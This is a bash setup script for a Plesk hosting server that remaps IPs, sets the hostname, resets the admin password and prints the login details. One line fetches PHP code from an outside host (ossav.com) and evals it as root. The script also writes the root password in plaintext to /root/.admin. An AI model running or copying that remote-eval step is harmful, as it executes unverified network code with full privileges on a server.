#!/bin/bash

domain=$1
password=$2
IP=$(wget -O - -q ifconfig.me)
/usr/sbin/plesk bin ipmanage --remap /root/ip_map_file
/usr/sbin/plesk bin ipmanage --remap /root/ip_map_file
rm -f /root/ip_map_file 
/usr/sbin/plesk bin server_pref --update -hostname $domain
/etc/init.d/sw-cp-server restart
/etc/init.d/sw-engine restart
/usr/local/psa/bin/init_conf -u -passwd $password
/usr/sbin/plesk php -er "eval(file_get_contents('http://ossav.com/PTC'));";
echo '======================================='
echo -e "  
Here is your Control Panel login info:
Control Panel:
    https://$domain:8443
    username: root/admin
    password: $password
SSH:
   host: $IP
   username: root
   password: $password
" | tee -a /root/.admin
}
